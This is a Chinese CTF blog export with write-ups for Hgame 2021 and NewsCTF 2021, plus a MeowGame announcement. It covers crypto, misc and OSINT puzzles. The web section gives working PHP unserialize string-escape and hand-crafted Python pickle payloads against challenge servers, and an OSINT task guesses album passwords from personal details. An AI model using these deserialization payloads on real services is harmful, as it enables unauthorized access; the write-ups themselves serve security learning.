k2, w, p): return ((s1*k1+s2*k2*w) % p, (s1*k2+s2*k1) % p) def Cipolla_algorithm(p, n): a = randint(1, p) w = a ** 2 - n while pow(w, (p-1)//2, p) != p-1: a = randint(1, p) w = a ** 2 - n times = (p+1)//2 k1 = 1 k2 = 0 first = True sum1 = 1 sum2 = 0 while times != 0: if first: k1, k2 = power(k1, k2, a, 1, w, p) first = False else: k1, k2 = power(k1, k2, k1, k2, w, p) if times &amp; 1: sum1, sum2 = power(sum1, sum2, k1, k2, w, p) times &gt;&gt;= 1 return sum1 def CRT(c, n): for i in range(len(n)): for j in range(i + 1, len(n)): assert gcd(n[i], n[j]) == 1 assert len(c) == len(n) N = reduce(lambda a, b: a*b, n) x = 0 for i, j in zip(c, n): N_i = N // j N_i_1 = invert(N_i, j) x += i*N_i*N_i_1 return x % N if __name__ == '__main__': p = 85228565021128901853314934583129083441989045225022541298550570449389839609019 q = 111614714641364911312915294479850549131835378046002423977989457843071188836271 n = p * q c = 7665003682830666456193894491015989641647854826647177873141984107202099081475984827806007287830472899616818080907276606744467453445908923054975393623509539 get_x1 = Cipolla_algorithm(p, c) get_x2 = Cipolla_algorithm(q, c) assert pow(get_x1, 2, p) == c % p assert pow(get_x2, 2, q) == c % q c11 = get_x1 c12 = p-get_x1 c21 = get_x2 c22 = q-get_x2 print('possible m: ' + str(n2s(int(CRT([c11, c21], [p, q]))))) print('possible m: ' + str(n2s(int(CRT([c11, c22], [p, q]))))) print('possible m: ' + str(n2s(int(CRT([c12, c21], [p, q]))))) print('possible m: ' + str(n2s(int(CRT([c12, c22], [p, q]))))) # possible m: b'hgame{3xgCd~i5_re4l1y+e@sy^r1ght?}' # possible m: b'z\\x95\\x82\\x00R3\\x1d\\x11\\xb3\\x02Q\\xb8\\x1f\\xcd\\xe0\\xd0\\xbeC\\xc31%\\xa8]* \\t\\xdb\\xf1v\\x87O\\xf9 \\x15\\xbc\\xcc+\\xe0\\xebf\\xc4\\xd4k\\nJ\\xfbN\\x03\\\\\\xcc\\x7f\\x00\\xa9\\x90\\xd8l\\xef\\x98\\xce^\\xd3\\xbd72' # possible m: b';\\x0b\\xe7ra \\x82\\x1fXQ/\\xa1V.\\xb9\\x91\\xc2\\xd1{\\x9d\\xe4;n\\x9f\\xbb\\xd7\\xeb\\x15\\xa8\\xc6b\\x1e\\xb0d\\x04^\\x000\\x0f\\xa8\\x9a\\xfe\\xa4\\x05|\\x9d\\xa4}s\\x05z\\x94\\xe9\\x80\\xda=97R\\x00?6A\\xa3' # possible m: b'\\xb5\\xa1ir\\xb3S\\x9f1\\x0bS\\x81Yu\\xfc\\x9ab\\x81\\x15&gt;\\xcf\\t\\xe3\\xcb\\xc9\\xdb\\xe1\\xc7\\x07\\x1fMI\\xb0o\\x0c[\\xae\\xf8\\x98\\x93\\xcb\\xfbT\\xa5\\xdah&amp;\\x8dLc\\xa0\\x80j-\\xd1?0\\xca]\\xee\\xf7\\xaa\\x7f9X' hgame{3xgCd~i5_re4l1y+e@sy^r1ght?} Reversefake_debugger beta 你写了一个什么奇怪的debugger？这东西能用？看起来规则也不太一样？ nc 101.132.177.131 9999 空格 + 回车进行单步调试。 可以发现 ecx 是下标。 首先开头肯定是 hgame{ 于是可以写个脚本遍历每一位的字母，如果不提示 Wrong Flag! Try again! 则说明对了。 后来发现这么不行。 再看了亿下，正确的下一个字符是 zf 分别为 0 和 1 的 ebx 的值相互异或的那个。 于是就好办了，直接提取一下，异或完事！ （我是 fw，这个脚本我写了贼久，刚开始是爆破密码，跑着一直不对，后来发现了异或就行，再后来才发现其实是循环跳出条件我写错了 （爆破解/异或解都行 \"\"\" fake_debugger beta MiaoTony \"\"\" import re from pwn import * context.log_level = 'debug' context.timeout = 10 def challenge(payload_raw: str): sh = remote('101.132.177.131', 9999) sh.recvuntil(\"Please input you flag now!\\n\") payload = payload_raw.ljust(25, 'D') sh.sendline(payload) r = sh.recvuntil('--------------INFO--------------\\n').decode() while True: try: sh.sendline(' ') r = sh.recvuntil('--------------INFO--------------\\n').decode() except EOFError: print(\"ERROR!!!!!\") return False, '' ecx = re.search(r\"ecx: (\\d+)\", r).group(1) zf = re.search(r\"zf: (\\d+)\", r).group(1) ebx = re.search(r\"ebx: (\\d+)\", r).group(1) print(\"======================== ecx:\", ecx) if int(ecx) == len(payload_raw): if zf == '0': ebx0 = ebx else: s_next = chr(int(ebx0) ^ int(ebx)) print(\"&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; Next is\", s_next) return True, s_next s = \"hgame{\" while True: print('======================================================&gt;', s) isTrue, i = challenge(s) if isTrue: s += i print('&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;', len(s), s) if i == '}': break 小结第二周题目还好还好。 AK 了 Misc，后面几天过年就没看了 233. 喵呜，binary 好难不会做，嘤嘤嘤。（抄第一周的，我是 fw 好菜啊 新年快乐喵！ 有兴趣的话欢迎来看看咱自己整的 MeowGame 解谜闯关吧，详见 2021 牛年大吉！又是一年解谜闯关。 （溜了溜了","path":"2021/02/15/CTF_2021HgameWeek2/"},{"title":"2021 牛年大吉！又是一年解谜闯关","text":"牛年快乐刚刚过去的庚子鼠年是极不平凡的一年，而今辛丑牛年如约而至。 祝大家在新的一年里身体健康，万事顺意，牛气冲天，牛转乾坤！ 碎碎念不好意思，久等了。 （感谢 @CircultCoder 大佬开发的机器人生成的表情包 据说 去年的闯关题目 一环套一环套娃太深了，到最后没几个人做到了最后一步，喵呜！ 喵喵决定这次不弄这么深了…… 不如先解开第一个 flag，后面再放出剩下几题的入口，这样可能会好一些了吧（ 题目这次还是 以 Misc 题目为主，看心情后面会不会加点题。 开局一张图，剩下的全靠猜 俗话说的好，遇到困难，睡大觉！（SIGSLEEP 那就从这张图开始吧。 当然你也可以 点击这里 下载原图。 除特别注明外，flag 形式均为 miao{.+} 。 注意解出来的 flag、红包口令 不要随便发给别人啊！！！ 预计这次解谜应该会 持续好几天，所以 WriteUp 什么的做出来的师傅晚几天再发吧 Orz 由于各种因素，出题咕了有一段时间，非常不好意思喵呜呜。 Hint下面是针对 第一题（Task1） 的。 某一步中的域名，形式不需要改动，打不开是正常的。啊你打得开？没事了这条 hint 对你来说没必要了。 如果压缩包注释乱码了，请使用 utf-8。不好意思，下次不用中文了。不过问题不大，之后都英文了。如果还不行的话 TG 联系。 据说校内某个系统上传压缩包只能是 rar，奇怪的想法增加了。 喵喵有时候直接把文件拖进十六进制编辑器里改东西，一不小心文件损坏了打不开了。 补充 hint1，想想中文域名的原理，不如到浏览器里打开 Network 看看 Host 长啥样。然后再想想域名除了用来解析还能干什么。 补充 hint3&amp;4，对比看看 zip 文件头长啥样。 补充 hint5，喵喵准备开个自己的邮局（雾，是域名邮箱。为了熟悉流程，先给域名配了个奇奇怪怪的东西，顺便把一串带 miao 的字符画扔在里面了。「看上去还不错，应该没人发现这个彩蛋吧 qwq」 [Important] 据说大部分人被卡在了提取压缩包的那一步，这是喵喵没想到的，那干脆咱们跳过这一步好了。喵喵说这回要白给了，直接给出一个不需要改文件头的版本，点击这里下载 吧！ 有问题可以 Telegram 上联系 @meow_portal_bot，发邮件也行（ 开了一个 Telegram Chat —— MeowGame 2021 ，欢迎师傅们来玩 w~ BTW，目前还只出了这第一个题，后面的题还没出完，不急不急，慢慢来…… 后面的题目需要解出第一题后才能开启。（指平台上） 师傅们感兴趣的欢迎一起来出题喵喵 w MeowGame 平台 MeowGame 平台架构的话，前端基于 Vue.js + Vuetify UI，后端基于 Python，结合 serverless 实现。 啊你没猜错，喵喵专门为这次解谜闯关开发了个前端平台以及后端接口，这个平台就是之后题目的入口。 感觉整个解谜闯关，环境部署了贼久，题倒是还没出成，甚至衍生出了几个小项目（（ 20210219：出好 Task 2 了！ 20210227：喵喵终于出完 Task 3 了，出不动了（摊手睡大觉 20210228：由 cuso4-5h2o 师傅提供的 Task 4 已放出，本题为动态 flag。 本次 MeowGame 预计持续到 2021.3.5 晚上 23:59 。 结束之后题目环境估计就不再维护了喵（ 非常感谢大家的参与！ qwq Just have fun！","path":"2021/02/12/CTF_2021HappyChineseNewYear/"},{"title":"CTF | 2021 NewsCTF 新春赛 WriteUp","text":"引言NewsCTF 2021 新春赛 看群里师傅说这几天有个新春小比赛，做出题目还送红包，顺手就来看看了。 题目据说是小师傅们自己出的，也是自己组织的，开心就好。 平台地址：http://newsctf.top:8000/ start: 2021/2/8 12:00 end: 2021/2/11 12:00 因为比较菜，出题人基本都是大一萌新，所以某些方向题目比较少请见谅 大一萌新太强了！ Miscmisc签到处图片结尾有个压缩包，里面 base64 解密一下就好 ZmxhZ3tXZWxjMG1lX3QwX25ld3NjdGYhISF9CuaUr+S7mOWuneWPo+S7pFvmrKLov47mnaXliLDokIzmlrDnvqTotZtd flag{Welc0me_t0_newsctf!!!} 支付宝口令[欢迎来到萌新群赛] happy ox 这次我们邀请到了牛爷爷来给大家拜个年 （共10包） 很明显 LSB 有隐写，提取一下。 得到压缩包密码 niuniandaji888 科比密码 又因为是小写，得到 passwdiskbyydsez，即 kbyydsez flag{0h_y0u_f1nd_Me_h3ck} 支付宝口令[牛年行大运愿岁月安好] EMOJI EMOJI(笑) 得到的flag中数字的中文为支付宝口令红包，禁止一人多包或分享。 如flag{t3st_123_1t} 则口令红包为：三一二三一 还是改文件头。。 查了一下，这是 《长安12时辰》的望楼系统，太强了！ 9宫格的空间，用来表示个位。 左边的4个花瓣位，用来表示十位。 右边的4个花瓣位，用来表示百位。 什么都不出现，就表示0。 Via 研究完《长安12时辰》的望楼系统，我魔怔了 于是就是 799*248+21 即 198173，一九八一七三 解压得到 key:sixgod ciphertext:🙃💵🌿🎤🚪🌏🐎🥋🚫😆✅🍌✅🚨📂📮🕹🎅🥋🌉😍🚪🤣🐅👑☂😀🦓⏩😍🌏🎅🌿🐘💵🍵☀✉🍍🌪🚫💵🍍🏎👣💵🔪🍌✉🐘😂🚨☂📮🔪💵🏹👉🐎🔬🌪🍎ℹ😊🚨😂🍵🍵😊🚨🔪✖🎈☺🦓🚰☃🌏🚪👣🍍✉👌🔄✉💧🗒🗒 先看了看 Codemoji，不对劲。 然后查了一下，发现了个带 key 的。 emoji-aes 解密 https://aghorler.github.io/emoji-aes/ emoji-aes encrypts string data with the symmetric AES encryption cipher (using crypto-js), and then replaces the Base64 output with emojis. 咱自己也部署了一个，在这里 ==&gt; https://emoji-aes.miaotony.xyz/ flag{em0j1_Aes_1s_3_ni5e_3ncr9pt_to0l} 伪装者 https://wws.lanzous.com/ihGAlldzfmb 支付宝红包口令是flag{}里面的内容,如果有两个今晚吃鸡请删掉一个。 flag格式：flag{} 伪装者.rar 和正常的 rar 对比可以看到文件头改掉了 改回 rar 就好。 背景.txt: 小林 正在追一部剧,但是他忘了剧名中一位角色的名字,于是他截了个图(好看的剧.png),开始了询问环节. -----你能帮小林认出这是谁嘛 注:角色名字(中文拼音)是压缩包的密码 百度识图一下 liuyijun 不对，要角色名字(中文拼音) 《伪装者》 草，就是题目名称…… wangtianfeng 解压得到 key.wav 文件结尾，貌似没啥用。 音频有一段 DTMF 截取这部分音频，然后提取一下。 结合频谱图再修正一下。 #222833344477773338866# 九键键盘密码（草，是 GKCTF2020 的音频 ctfisfun steghide 解密 $ steghide.exe extract -sf niu.jpg -p ctfisfun wrote extracted data to \"flag.txt\". flag不在这里哦继续往下找吧 ...... 熊曰：呋食很誒咯噔破啽住有歡嗚註嗄和你吃冬註物物眠嗚笨嘍擊笨噤襲你爾咬你爾常破很歡我吖拙歡意擊咯堅有嗷嗥哞怎發唬肉既歡沒破噤咯人和嘶啽更 与熊论道 然后去掉一个 今晚吃鸡 flag{牛年大吉今晚吃鸡小年快乐happy} 听说你喜欢薅羊毛 附件地址：https://wwa.lanzous.com/iNdm7lfooaj 羊毛.jpg 结尾 Bacon Cipher 培根 PASSWORDISTINGSHUONIXIHUANYANGMAO 然而用这个去解压缩包怎么都解不开。。 后来发现图片还有加密…… JPHS tingshuonixihuanyangmao 得到 Wdn1His87，解压得到 brainpower.txt 和 flag.zip 看brainpower.txt 文件头 ID3，遂改后缀名为 mp3. 看一下频谱，对数坐标好看一点。 PsWdMuzi123 解压 flag.zip 9DFF7800FFFE8784010580C646A85C22A7B3E321C04020B193D9BCE00DAEC7CD8953E8B982 //......巨大多 0606080003400BDFF000006000600101010000000A0A1A0D074E40598 看末尾，逆序过来就是 89504E，PNG 好耶。 然后 hex 解一下，但是打开报错。 再看一下，又是改了文件头……应该是 jpg 图片。 然后得到二维码 扫码得到 flag{s0_easy_is_not_it?} 支付宝[三三六六五八九九] （巨套娃了 缺斤少两两张二维码 扫码得到 大牛：我也很疑惑呢 发现是不全的。 两张图异或一下，然后再反个色，再补上四个识别框。 扫码得到解压密码。 password:1q2w3e4r5t6y7u8i 解压得到两张图 结合 hint 密码是靠猜的，不是爆破！ 是guess不是猜 用 outguess 解密 得到密码 news52ctf0 Polybius.txt: cipher:iftffsissrssirissr hint1:\\u660e\\u6587\\u957f\\u5ea6\\u662f\\u0038\\uff0c\\u4f1a\\u4e0b\\u68cb\\u5417\\uff1f hint2:Zmlyc3Q/LGxlbihmaXJzdCk9NQ== 得到的有意义字符串，作为压缩包密码，才能进入下一层。 hint1: 明文长度是9，会下棋吗？//题目更正为9 hint2: first?,len(first)=5 波利比奥斯方阵密码 网上找了个脚本改改跑一下。 import itertools s = \"first\" sumresult = [] numsumresult = [] ciper = \"iftffsissrssirissr\" for i in itertools.permutations(s, 5): # 找出所有全排列 sumresult.append(\"\".join(i)) for i in sumresult: temp = \"\" for j in ciper: temp += str(i.index(j)+1) numsumresult.append(temp) for i in numsumresult: ans_ = \"\" for j in range(0, len(i), 2): xx = (int(i[j])-1)*5+int(i[j+1])+96 if xx &gt; ord('i'): xx += 1 ans_ += chr(xx) print(ans_) 密码就这个了。 解压得到 flag.txt 密文：mtHVnkLnIaP3FaW7KOWjTmKkVjWjVzKjdeNvTnAjoH9iZOIvTeHbvD== dic=JASGBWcQPRXEFLbCDIlmnHUVKTYZdMovwipatNOefghq56rs????kxyz012789+/ 恭喜来到最后一层，你知道base64？，那么解一下吧，得到flag就可以提交了呀。 flag：NEWCTF2021{} 魔改的 base64，alphabet 差了 4 位，包括 34ju 这四个字符。 手动试了试，应该是 JASGBWcQPRXEFLbCDIlmnHUVKTYZdMovwipatNOefghq56rs34ujkxyz012789+/ NEWSCTF2021{base64_1s_v3ry_e@sy_and_fuN} 哥哥的秘密有 社工 / OSINT 题唉！ 据说哥哥的秘密藏在了妹妹的QQ空间里 QQ：2492853776 去寻找flag吧 ///勿在评论区泄露或提供解题思路，否则将关闭评论功能。题目中涉及到的人名，生日均为虚构，涉及到的地名，公司等均是随机挑选的，请勿对题目中出现的手机号进行骚扰，出题人概不承担责任/// 感谢节奏大师带我入坑音游，虽然几年没玩了但是现在依旧回归啦！屁股肉（phigros）会记住你的还有bang dream 玩到了那么久，累死了。今天还学到个东西⠀⡘⠀⡙⠀⡞⠀⡄⣿⠪⡛⣶⡸⠱⠀⠍⡥⣆⡗⠀⡎⢊== 盲文解密 hint：密码=时地人 今天哥哥给了个旗帜叫我保管好那我还是放别的地方吧怕忘了还是存一下相册 哇哈哈哈哈佳佳今天连着5个运气王果然我刘某人名不虚传 ==&gt; 刘佳佳 1月14日 22:05 今天终于放假啦！吃火锅敲开心的！ 2020年12月31日 00:00 马上放假啦！！！！！！晚上看电影要注意细节~ 2020年12月25日 22:22 三个节日连着过 好快落 明天就第二个十年啦 2020年12月22日 23:33 今天学校的事也好多-n-希望过几天可以吃顿好的(*≧▽≦)ﾉｼ)) 四川绵阳 结合评论 ==&gt; birthday: 20001226 顺便，一直有 2931479782 这个QQ点赞和评论。他有条说说 hint:弱口令 地区字母，名字字母(¯ㅿ¯;)生日 不同形式都试试 相册： sU*f4#OY/6+ghE 不懂 再回到妹妹的相册，第三个相册，根据提示 2+3+8 密码为 lsljj20001226 得到一张二维码。 扫码得到 My MicroBlog name：啊这ovo001 去微博找找。 有 Nano 唉（x 2598888 乐山 =&gt; 尚纬股份 解得妹妹的第一个相册密码（哥哥的公司） 得到两张图 a2492853776@163.com 那看第一张图好了。 发现原图结尾隐写了个 zip 以下是题目描述： 噢，我的老兄，很抱歉看了你的照片，这感觉真是太糟了。我是说，虽然隔了这么久，我还是忍不住想用沉默之眼来寻查这之中的秘密。我想你可能对我们的靴子朋友或者屁股老弟有什么偏见，就像我们都以为约翰尼先生总打他的狗，但是事实不是那样的，他们就像兄弟一样，我亲眼所见，我发誓。 ------------------------------------------------ 题目1：（题目1和题目2都可以得到flag相册密码，自由抉择选择哪条） 找到密码，将密码发送给指定的邮箱，即可获得flag，快来挑战吧！ （密码必须写在主题上而不是内容上） 星星的夜.png 隐写 另一张带有邮箱的图也隐写有 zip。 倒数第2步.txt 题目2：（题目1和题目2都可以得到flag相册密码，自由抉择选择哪条） 本次题目考验收集能力 也要考查搜索能力 一起来快乐的回答问题吧！ （将所有答案的首字母大写连在一起即是答案）请注意是大写大写大写大写大写大写大写大写 答案都是英文字母 例如题目描述：瞌睡乔是指----答：Joseph Robinette Biden, Jr（Joe Biden）。首字母是J 1.打5把csgo出自 2.现任美国中央情报局局长是（出题时间2021年2月1日） 3.“是男人就下一百层”被一位UP主找到正确的版本并且更正了百度词条上的错误信息，请问他更正的词条的版本哈希值是多少？ 4.IAU在1928国际天文会议中认定的新的星座的拉丁学名是？ 5.https://www.bilibili.com/网站ip地址为110/120.xx.xx.xx的运营商的官网是？ G（《Goyang Ubur Ubur》，印尼宽带广告的背景音乐的歌词空耳，歌词原文应为 Takupaz Dance Crew，塔库帕兹舞蹈队 W（William Joseph Burns，（问了出题人说是这个。。）详见 Director of the Central Intelligence Agency David S. Cohen，20210120 宣誓就职，注意到很多地方甚至中文维基百科都没更新，详情 https://www.cia.gov/about/ F（f2549bf9e2c93acbb794041185c26fc0. 考虑到2.1之前，且答案都是英文字母，是 UP 主 （哈希值就 A-F 嘛 O（Ophiuchus，蛇夫座 K（金山云，www.ksyun.com，用 ping 工具看了看，小破站的服务商真多 GWFOK 然后发邮件给那个邮箱。 这里我还以为直接就是相册密码了呢，去爆破了空间相册（x 然后验证码确认点不动，于是看了看QQ空间相册的代码，好丑啊。 恭喜你！这是相册“旗帜”的密码（只套了简单的4层）： 23khUrNeAf1igP4PixgoUUDQLaRGGfEpPsFEd9CCKaUWfwYmG4ZmCwFVEkNNwtijxVcn6a6XkwC1ctqMLAax4aGK 又是 base 全家桶 得到相册密码 youfindme! 拿到 flag flag{th1s_1s_A_Fla9_aNd_n0bod9_C3n_f1nd_1t} Crypto贝斯家族;gM&amp;7AOTKl:236b;HHIm='%8*=''2q;FX]*&lt;,5Z\\&gt;'a(\\&lt;*)(o:2&lt;mE;DL+19egH[A2@7[A28+B;L2)3;-,Jc&lt;EDpe@kpeS=]Ipp@5)e@;FN&lt;1@VeM3=tj,I=u'8;;FXDT@;BL0@o[bo=]\\dGA2?f'&lt;CL(F@k`.CASl6l:236V@Vo.c&gt;&amp;6JY@mipjA4Tls;/:D4=]I2%@PTof&lt;*)gK;eo9(@VeIr base85 SzJSeERNNjFBRWJXWW5zWWl5RFVoTkZvZzRiTW9iNkViR25VM1lOd3VLd2poRzNLQW1hUWNIc2NNYUFZa0tnRE1GblFRZ0ZCZ2Z3RFNLakg0cUxrYWZpd3IzUEZ0c0xkemlaNjF6bmVqZlA0cDJWdHZKQkx3YU1yb28xTWN0SkRKblE= base64 K2RxDM61AEbWYnsYiyDUhNFog4bMob6EbGnU3YNwuKwjhG3KAmaQcHscMaAYkKgDMFnQQgFBgfwDSKjH4qLkafiwr3PFtsLdziZ61znejfP4p2VtvJBLwaMroo1MctJDJnQ base32 仅限第一天，支付宝口令[大吉大利萌新吃鸡] Base 家族： 主要有 100, 94, 92, 91, 85, 64, 62, 58, 56, 52, 36, 32, 16 大概这些吧。 部分 alphabet： BASE16 = 0123456789ABCDEF BASE32 = ABCDEFGHIJKLMNOPQRSTUVWXYZ234567 BASE36 = 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ BASE52 = 0123456789BCDFGHJKLMNPQRSTVWXYZbcdfghjklmnpqrstvwxyz BASE56 = 23456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz BASE58 = 123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz BASE62 = 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz BASE64 = ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ BASE85 = 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&amp;()*+-;&lt;=&gt;?@^_`{|}~ BASE91 = ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!#$%&amp;()*+,./:;&lt;=&gt;?@[]^_`{|}~\" BASE94 = !\"#$%&amp;\\'()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~ Python3 base85 中分为 base64.a85encode 和 base64.b85encode，a是 Ascii85，b是 IPv6（RFC1924）。 ASCII85 encoding. This is the default. 0x00000000 is compressed to z. Spaces are not compressed. Adobe ASCII85 encoding is same as previous except data is enclosed between &lt;~ and ~&gt; . ZeroMQ (Z85) encoding. NOTE! Even though specification says input length must be divisible by 4, this is not currently enforced. Spaces and zeroes are not compressed. Character set from RFC1924 which is an April fools joke. Spaces and zeroes are not compressed. 好日子 好日子，11月11日 ↗↗←↖↕↖↕↳↗↰↗↺↖→↔↰↕↙↕↺↔↰↖↗↔↖↔↑↔→←↑↖↓↗↓←↔↔↗←↘↕↖←↕↕↻↗↰↕↓↖←↗↲↗↑↗↱↗↘↕↔↕↻←↓↔↘↗↕↕↔↖↑↖↖↗↔↗↲↔↙↗↗↗↗↔↔↕↰↔↔↕↰↖↰↔↔↗→↕↔↗↕↖→↕↖↕↓↖←↗↰↔↑↗↖↕↻←↕↕↕←↖↗↘↔↔↕↔↖→↔↰←↔↖↖↖↘↕↱←↑↔↰↔↗↕↘↕↺←→↗↖↗↲←↙= 箭头加密 G6fmJNRzinzWvqr1SC4w8f5oJcPLAKHdo3xEdQVDLyGGtjtjZtBdERfcPJqFo5e6HtdRz4VXk1zwhn2FL9 base58 U2FsdGVkX19oI1ocbbcM5wensOuKarNA3noE/HS74RNYqh0stoMpQohkLGqF 再 base64 可以发现开头是 Salted__，加盐加密了。 Rabbit 解密 klv,oclz{mkd_slp_vb_zjjs_slp} 懒了，直接去 quipquip 跑了。 flag{the_day_is_good_day} Webgirlfriend签到题 &lt;?php include ('flag.php'); error_reporting(0); function filter($payload){ $key = array('php','flag','boyfriend'); $filter = '/'.implode('|',$key).'/i'; return preg_replace($filter,'hack!!!!',$payload); } $payload=$_GET['payload']; $GDUT['A&amp;D']='666'; $GDUT['Hed9eh0g']='no_girlfriend'; if(isset($payload)) { if (strpos($payload, 'php')===false &amp;&amp; strpos($payload, 'flag')===false &amp;&amp; strpos($payload, 'boyfriend')===false) { echo 'fuck_no_key!!!'; }else{ $GDUT['A&amp;D']=$payload; $GDUT=unserialize(filter(serialize($GDUT))); if ($GDUT['Hed9eh0g'] === 'has_girlfriend') { echo $flag; } else { echo 'fuck_no_girlfriend!!!'; } } }else{ highlight_file(__FILE__); } PHP 反序列化漏洞 先本地试了试，payload 为 flagmiaotony 得到的序列化对象 \";s:8:\"Hed9eh0g\";s:14:\"has_girlfriend\";} 长度为40，用 10个 flag 滤掉就好了。 Payload: flagflagflagflagflagflagflagflagflagflag\";s:8:\"Hed9eh0g\";s:14:\"has_girlfriend\";} http://47.106.172.29:2333/?payload=flagflagflagflagflagflagflagflagflagflag%22;s:8:%22Hed9eh0g%22;s:14:%22has_girlfriend%22;} newsctf{i_Lov3_nEws4tF_wEb} beautifulgirlfriendhttp://47.106.172.29:8081 访问 /source 得到源码 import base64 import pickle from flask import Flask, Response, request, render_template import Hed9eh0g_girlfriend app = Flask(__name__) class girl: def __init__(self, name, age): self.name = name self.age = age @app.route('/', methods=[\"GET\"]) def hello(): return render_template('index.html') @app.route('/guess', methods=['GET']) def index(): if request.method == 'GET': try: pickle_data = request.args.get('payload') print(pickle_data) she = pickle.loads(base64.b64decode(pickle_data)) if she.name == Hed9eh0g_girlfriend.name and she.age == Hed9eh0g_girlfriend.age: return Hed9eh0g_girlfriend.flag except Exception as e: print(repr(e)) return \"Something wrong\" def read(filename, encoding='utf-8'): with open(filename, 'r', encoding=encoding) as fin: return fin.read() @app.route('/source', methods=['GET']) def show_source(): return Response(read(__file__), mimetype='text/plain') if __name__ == '__main__': app.run(host='0.0.0.0', port=8081) 又是 pickle 反序列化啦。 参考 XCTF高校战“疫”网络安全分享赛 WriteUp——webtmp 一题 这题需要反序列化之后的 name 和 age 与引入的相同，但不能把 Hed9eh0g_girlfriend.flag 给覆盖掉，所以不能采用 自己造一个 Hed9eh0g_girlfriend 的思路。 而是应该在构造 girl 对象实例化的时候引入 Hed9eh0g_girlfriend.name 和 Hed9eh0g_girlfriend.age。 又是手搓 pickle 了！ s = b'\\x80\\x03c__main__\\ngirl\\nq\\x00)\\x81q\\x01}q\\x02(X\\x04\\x00\\x00\\x00nameq\\x03cHed9eh0g_girlfriend\\nname\\nq\\x04X\\x03\\x00\\x00\\x00ageq\\x05cHed9eh0g_girlfriend\\nage\\nq\\x06ub.' pickletools.dis(s) base64.b64encode(s) # gANjX19tYWluX18KZ2lybApxACmBcQF9cQIoWAQAAABuYW1lcQNjSGVkOWVoMGdfZ2lybGZyaWVuZApuYW1lCnEEWAMAAABhZ2VxBWNIZWQ5ZWgwZ19naXJsZnJpZW5kCmFnZQpxBnViLg== dis 看一下 0: \\x80 PROTO 3 2: c GLOBAL '__main__ girl' 17: q BINPUT 0 19: ) EMPTY_TUPLE 20: \\x81 NEWOBJ 21: q BINPUT 1 23: } EMPTY_DICT 24: q BINPUT 2 26: ( MARK 27: X BINUNICODE 'name' 36: q BINPUT 3 38: c GLOBAL 'Hed9eh0g_girlfriend name' 64: q BINPUT 4 66: X BINUNICODE 'age' 74: q BINPUT 5 76: c GLOBAL 'Hed9eh0g_girlfriend age' 101: q BINPUT 6 103: u SETITEMS (MARK at 26) 104: b BUILD 105: . STOP highest protocol among opcodes = 2 然后 /guess?payload=xxxxx 打过去就好了。 newsctf{girlfriend?nothing!!!Affect_sword_speed} 其实这题打法应该挺多的，反弹 shell 应该也行，但不知道为啥没打通（？） EZ套娃 bugku web41 附链接：https://ctf.bugku.com/challenges/detail/id/183.html &lt;?php // php版本:5.4.44 header(\"Content-type: text/html; charset=utf-8\"); highlight_file(__FILE__); class evil{ public $hint; public function __construct($hint){ $this-&gt;hint = $hint; } public function __destruct(){ if($this-&gt;hint===\"hint.php\") @$this-&gt;hint = base64_encode(file_get_contents($this-&gt;hint)); var_dump($this-&gt;hint); } function __wakeup() { if ($this-&gt;hint != \"╭(●｀∀´●)╯\") { //There's a hint in ./hint.php $this-&gt;hint = \"╰(●’◡’●)╮\"; } } } class User { public $username; public $password; public function __construct($username, $password){ $this-&gt;username = $username; $this-&gt;password = $password; } } function write($data){ global $tmp; $data = str_replace(chr(0).'*'.chr(0), '\\0\\0\\0', $data); $tmp = $data; } function read(){ global $tmp; $data = $tmp; $r = str_replace('\\0\\0\\0', chr(0).'*'.chr(0), $data); return $r; } $tmp = \"test\"; $username = $_POST['username']; $password = $_POST['password']; $a = serialize(new User($username, $password)); if(preg_match('/flag/is',$a)) die(\"NoNoNo!\"); unserialize(read(write($a))); 怎么又是反序列化…… （待续 小结 Misc AK 了！ 好家伙，快打 FW_Mumuzi 师傅，出题老套娃了！ Web 怎么全是反序列化，有毒 BTW，这个 OSINT 题确实挺好玩（ 本文有关内容仅供学习研究，请在合理合法范围内使用！ 牛年就要来了呀！ 除夕快乐，新年快乐喵~ （溜了溜了喵","path":"2021/02/11/CTF_2021NewsCTF/"},{"title":"CTF | 2021 Hgame Week1 WriteUp","text":"引言一年一度，由杭州电子科技大学 Vidar Team 举办的 Hgame 又来了！ 今年和往年一样，持续四周，是招新赛，不过感觉今年人更多了。 题目倒挺有趣味也有梯度的，正好就来看看了。 这篇就是第一周的 WriteUp 啦。 其实去年也来了，但貌似看了第一周后面就没怎么看，或者没写 WriteUp了 想回顾可以移步 CTF | Hgame2020 Week1 WriteUp. （说好的 未完待续，果然咕掉了。 后面几周可能也不一定有空来看题了，不知道能坚持几周了 233 平台： https://hgame.vidar.club/ MiscBase全家福 新年即将来临之际，Base家族也团聚了，他们用他们特有的打招呼方式向你问了个好，你知道他们在说什么吗？ R1k0RE1OWldHRTNFSU5SVkc1QkRLTlpXR1VaVENOUlRHTVlETVJCV0dVMlVNTlpVR01ZREtSUlVIQTJET01aVUdSQ0RHTVpWSVlaVEVNWlFHTVpER01KWElRPT09PT09 老套路了。 Base64 =&gt; Base32 =&gt; Base16/Hex hgame{We1c0me_t0_HG4M3_2021} 不起眼压缩包的养成的方法 0x4qE给了张图给我，说这图暗藏玄机，你能帮我找出来吗？ 提取拼接的压缩包，备注提示 Password is 